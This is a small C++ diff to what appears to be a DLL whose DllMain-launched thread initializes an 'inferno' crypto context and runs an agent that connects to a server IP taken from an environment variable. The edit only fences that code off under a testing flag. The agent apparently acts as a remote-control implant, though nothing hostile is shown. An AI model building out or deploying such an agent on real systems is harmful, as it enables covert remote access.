@@ -49,8 +49,7 @@ static void agentThreadFunc() {
 #ifdef INFERNO_TESTING
     inferno::agent::constructorRan() = true;
     return;
-#endif
-
+#else
     inferno::CryptoContext::instance().initDefault();
 
     const char* env_ip = ::getenv("INFERNO_SERVER_IP");
@@ -68,6 +67,7 @@ static void agentThreadFunc() {
 
     inferno::Agent agent(ip, port);
     agent.run();
+#endif
 }
 
 BOOL WINAPI DllMain(HINSTANCE, DWORD fdwReason, LPVOID) {
